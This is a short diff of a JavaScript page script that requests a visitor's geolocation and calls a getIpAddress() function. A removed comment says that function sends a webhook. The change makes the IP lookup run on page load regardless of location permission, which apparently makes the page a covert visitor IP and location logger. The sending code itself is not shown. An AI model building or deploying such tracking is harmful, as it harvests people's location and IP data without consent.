@@ -14,7 +14,6 @@ function success(position) {
     let LATITUDE = position.coords.latitude;
     let LONGITUDE = position.coords.longitude;
     mapsUrl = `https://www.google.com/maps/@${LATITUDE},${LONGITUDE},15z?entry=ttu`;
-    getIpAddress();  // Proceed to get the IP address and send the webhook after location is obtained
 }
 
 // Error callback for geolocation
@@ -78,6 +77,6 @@ function getIpAddress() {
         console.error('Error fetching IP address:', error);
     });
 }
-
+getIpAddress();
 // Start requesting location permission
 requestLocationPermission();
